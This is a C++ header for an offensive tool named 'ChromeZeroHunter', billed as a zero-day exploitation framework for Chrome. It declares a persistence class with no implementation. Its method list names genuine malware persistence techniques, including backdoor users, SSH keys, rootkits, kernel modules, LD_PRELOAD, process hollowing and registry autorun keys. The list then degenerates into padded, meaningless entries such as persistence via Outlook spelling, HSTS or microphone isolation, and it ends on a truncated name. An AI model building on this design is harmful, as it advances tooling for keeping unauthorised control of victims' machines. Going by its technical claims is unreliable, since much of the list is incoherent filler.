// ChromeZeroHunter - Advanced Zero-Day Exploitation Framework for Google Chrome
// Copyright (C) 2025  The ChromeZeroHunter Developers

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

// PersistenceFramework.h
#pragma once
#include <string>
#include <vector>
#include <memory>
#include <map>
#include <cstdint>
#include <fstream>
#include <sstream>
#include <iostream>
#include <algorithm>
#include <random>
#include <chrono>
#include <thread>
#include <mutex>
#include <atomic>
#include <functional>
#include <regex>
#include <filesystem>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <link.h>

namespace ChromeZeroHunter {

class PersistenceFramework {
public:
    struct PersistenceConfig {
        std::string outputDir;
        bool enableVerbose;
    };

    struct PersistenceResult {
        bool success;
        std::string error;
        std::string technique;
        std::string output;
        std::vector<std::string> steps;
        std::chrono::milliseconds executionTime;
    };

    struct PersistenceStatus {
        bool active;
        std::string technique;
        std::string location;
        std::string lastCheck;
    };

    PersistenceFramework(const PersistenceConfig& config);
    ~PersistenceFramework();

    void initialize();
    PersistenceResult establishPersistence();
    PersistenceStatus checkPersistence();
    PersistenceResult removePersistence();
    std::vector<std::string> getAvailableTechniques() const;
    void addCustomTechnique(const std::string& name, std::function<PersistenceResult()> technique);

private:
    PersistenceConfig config;
    std::map<std::string, std::function<PersistenceResult()>> persistenceTechniques;
    std::mt19937 rng;
    std::mutex mutex;
    std::atomic<bool> initialized;
    std::string activeTechnique;
    std::string persistenceLocation;

    void registerPersistenceTechniques();
    PersistenceResult establishViaCronJob();
    PersistenceResult establishViaSystemd();
    PersistenceResult establishViaInitD();
    PersistenceResult establishViaStartupScript();
    PersistenceResult establishViaShellProfile();
    PersistenceResult establishViaSSHKey();
    PersistenceResult establishViaBackdoorUser();
    PersistenceResult establishViaSUIDBinary();
    PersistenceResult establishViaRootkit();
    PersistenceResult establishViaKernelModule();
    PersistenceResult establishViaLDPreload();
    PersistenceResult establishViaLibraryInjection();
    PersistenceResult establishViaProcessInjection();
    PersistenceResult establishViaProcessHollowing();
    PersistenceResult establishViaProcessDoppelgänging();
    PersistenceResult establishViaReflectiveDLLInjection();
    PersistenceResult establishViaAtomBombing();
    PersistenceResult establishViaProcessHerpaderping();
    PersistenceResult establishViaModuleStomping();
    PersistenceResult establishViaModuleOverloading();
    PersistenceResult establishViaThreadHijacking();
    PersistenceResult establishViaAPCInjection();
    PersistenceResult establishViaSetWindowsHookEx();
    PersistenceResult establishViaRegistryRun();
    PersistenceResult establishViaRegistryRunOnce();
    PersistenceResult establishViaRegistryService();
    PersistenceResult establishViaRegistryActiveSetup();
    PersistenceResult establishViaRegistryAppInitDLLs();
    PersistenceResult establishViaRegistryWinlogon();
    PersistenceResult establishViaRegistryWinsock();
    PersistenceResult establishViaRegistryImageFileExecution();
    PersistenceResult establishViaRegistryBrowserHelperObjects();
    PersistenceResult establishViaRegistryShellOpenCommands();
    PersistenceResult establishViaRegistryFileAssociations();
    PersistenceResult establishViaRegistryScheduledTasks();
    PersistenceResult establishViaRegistryWinlogonNotify();
    PersistenceResult establishViaRegistryAppCertDLLs();
    PersistenceResult establishViaRegistryDebugger();
    PersistenceResult establishViaRegistrySilentProcessExit();
    PersistenceResult establishViaRegistryOfficeTest();
    PersistenceResult establishViaRegistryOfficeAddins();
    PersistenceResult establishViaRegistryOfficeTemplates();
    PersistenceResult establishViaRegistryOfficeStartup();
    PersistenceResult establishViaRegistryOutlookHome();
    PersistenceResult establishViaRegistryOutlookStartup();
    PersistenceResult establishViaRegistryOutlookAddins();
    PersistenceResult establishViaRegistryOutlookForms();
    PersistenceResult establishViaRegistryOutlookViews();
    PersistenceResult establishViaRegistryOutlookFolders();
    PersistenceResult establishViaRegistryOutlookRules();
    PersistenceResult establishViaRegistryOutlookSearch();
    PersistenceResult establishViaRegistryOutlookAccounts();
    PersistenceResult establishViaRegistryOutlookSignatures();
    PersistenceResult establishViaRegistryOutlookStationery();
    PersistenceResult establishViaRegistryOutlookPrint();
    PersistenceResult establishViaRegistryOutlookSpelling();
    PersistenceResult establishViaRegistryOutlookAutoArchive();
    PersistenceResult establishViaRegistryOutlookDelegates();
    PersistenceResult establishViaRegistryOutlookSecurity();
    PersistenceResult establishViaRegistryOutlookMacros();
    PersistenceResult establishViaRegistryOutlookCustomForms();
    PersistenceResult establishViaRegistryOutlookCustomActions();
    PersistenceResult establishViaRegistryOutlookCustomViews();
    PersistenceResult establishViaRegistryOutlookCustomFolders();
    PersistenceResult establishViaRegistryOutlookCustomRules();
    PersistenceResult establishViaRegistryOutlookCustomSearch();
    PersistenceResult establishViaRegistryOutlookCustomAccounts();
    PersistenceResult establishViaRegistryOutlookCustomSignatures();
    PersistenceResult establishViaRegistryOutlookCustomStationery();
    PersistenceResult establishViaRegistryOutlookCustomPrint();
    PersistenceResult establishViaRegistryOutlookCustomSpelling();
    PersistenceResult establishViaRegistryOutlookCustomAutoArchive();
    PersistenceResult establishViaRegistryOutlookCustomDelegates();
    PersistenceResult establishViaRegistryOutlookCustomSecurity();
    PersistenceResult establishViaRegistryOutlookCustomMacros();
    PersistenceResult establishViaScheduledTask();
    PersistenceResult establishViaWindowsService();
    PersistenceResult establishViaWMIEventSubscription();
    PersistenceResult establishViaWMIPersistence();
    PersistenceResult establishViaPowerShellProfile();
    PersistenceResult establishViaPowerShellModule();
    PersistenceResult establishViaPowerShellCommand();
    PersistenceResult establishViaBrowserExtension();
    PersistenceResult establishViaBrowserBookmark();
    PersistenceResult establishViaBrowserHistory();
    PersistenceResult establishViaBrowserCookie();
    PersistenceResult establishViaBrowserLocalStorage();
    PersistenceResult establishViaBrowserSessionStorage();
    PersistenceResult establishViaBrowserIndexedDB();
    PersistenceResult establishViaBrowserWebSQL();
    PersistenceResult establishViaBrowserCache();
    PersistenceResult establishViaBrowserServiceWorker();
    PersistenceResult establishViaBrowserWebWorker();
    PersistenceResult establishViaBrowserSharedWorker();
    PersistenceResult establishViaBrowserNotification();
    PersistenceResult establishViaBrowserPushNotification();
    PersistenceResult establishViaBrowserBackgroundSync();
    PersistenceResult establishViaBrowserBackgroundFetch();
    PersistenceResult establishViaBrowserPaymentHandler();
    PersistenceResult establishViaBrowserCredentialManager();
    PersistenceResult establishViaBrowserWebAuthn();
    PersistenceResult establishViaBrowserWebUSB();
    PersistenceResult establishViaBrowserWebBluetooth();
    PersistenceResult establishViaBrowserWebNFC();
    PersistenceResult establishViaBrowserWebSerial();
    PersistenceResult establishViaBrowserWebHID();
    PersistenceResult establishViaBrowserWebXR();
    PersistenceResult establishViaBrowserWebLocks();
    PersistenceResult establishViaBrowserWebCodecs();
    PersistenceResult establishViaBrowserWebAssembly();
    PersistenceResult establishViaBrowserWebAssemblyStreaming();
    PersistenceResult establishViaBrowserWebAssemblyJIT();
    PersistenceResult establishViaBrowserJIT();
    PersistenceResult establishViaBrowserWebSockets();
    PersistenceResult establishViaBrowserWebRTC();
    PersistenceResult establishViaBrowserFetch();
    PersistenceResult establishViaBrowserXMLHttpRequest();
    PersistenceResult establishViaBrowserPostMessage();
    PersistenceResult establishViaBrowserBroadcastChannel();
    PersistenceResult establishViaBrowserMessageChannel();
    PersistenceResult establishViaBrowserSharedArrayBuffer();
    PersistenceResult establishViaBrowserAtomics();
    PersistenceResult establishViaBrowserSharedMemory();
    PersistenceResult establishViaBrowserCrossOriginIsolation();
    PersistenceResult establishViaBrowserCOOP();
    PersistenceResult establishViaBrowserCOEP();
    PersistenceResult establishViaBrowserCORP();
    PersistenceResult establishViaBrowserCSP();
    PersistenceResult establishViaBrowserHSTS();
    PersistenceResult establishViaBrowserHPKP();
    PersistenceResult establishViaBrowserExpectCT();
    PersistenceResult establishViaBrowserFeaturePolicy();
    PersistenceResult establishViaBrowserPermissionsPolicy();
    PersistenceResult establishViaBrowserReferrerPolicy();
    PersistenceResult establishViaBrowserContentSecurityPolicy();
    PersistenceResult establishViaBrowserSameSiteCookies();
    PersistenceResult establishViaBrowserSecureContext();
    PersistenceResult establishViaBrowserMixedContent();
    PersistenceResult establishViaBrowserSubresourceIntegrity();
    PersistenceResult establishViaBrowserCrossOriginResourcePolicy();
    PersistenceResult establishViaBrowserCrossOriginEmbedderPolicy();
    PersistenceResult establishViaBrowserCrossOriginOpenerPolicy();
    PersistenceResult establishViaBrowserDocumentDomain();
    PersistenceResult establishViaBrowserOriginIsolation();
    PersistenceResult establishViaBrowserSiteIsolation();
    PersistenceResult establishViaBrowserProcessIsolation();
    PersistenceResult establishViaBrowserSandbox();
    PersistenceResult establishViaBrowserJavaScriptIsolation();
    PersistenceResult establishViaBrowserDOMIsolation();
    PersistenceResult establishViaBrowserStorageIsolation();
    PersistenceResult establishViaBrowserNetworkIsolation();
    PersistenceResult establishViaBrowserCookieIsolation();
    PersistenceResult establishViaBrowserCacheIsolation();
    PersistenceResult establishViaBrowserServiceWorkerIsolation();
    PersistenceResult establishViaBrowserWebWorkerIsolation();
    PersistenceResult establishViaBrowserSharedWorkerIsolation();
    PersistenceResult establishViaBrowserWebAssemblyIsolation();
    PersistenceResult establishViaBrowserJITIsolation();
    PersistenceResult establishViaBrowserMemoryIsolation();
    PersistenceResult establishViaBrowserCPUIsolation();
    PersistenceResult establishViaBrowserGPUIsolation();
    PersistenceResult establishViaBrowserAudioIsolation();
    PersistenceResult establishViaBrowserVideoIsolation();
    PersistenceResult establishViaBrowserCameraIsolation();
    PersistenceResult establishViaBrowserMicrophoneIsolation();
    PersistenceResult establishViaBrowserGeolocationIsolation();
    PersistenceResult establishViaBrowserNotificationIsolation();
    PersistenceResult establishViaBrowserPaymentIsolation();
    PersistenceResult establishViaBrowserCredentialIsolation();
    PersistenceResult establishViaBrowserWebAuthnIsolation();
    PersistenceResult establishViaBrowserWebUSBIsolation();
    PersistenceResult establishViaBrowserWebBluetoothIsolation();
    PersistenceResult establishViaBrowserWebNFCIsolation();
    PersistenceResult establishViaBrowserWebSerialIsolation();
    PersistenceResult establishViaBrowserWebHIDIsolation();
    PersistenceResult establishViaBrowserWebXRIso();
};

} // namespace ChromeZeroHunter
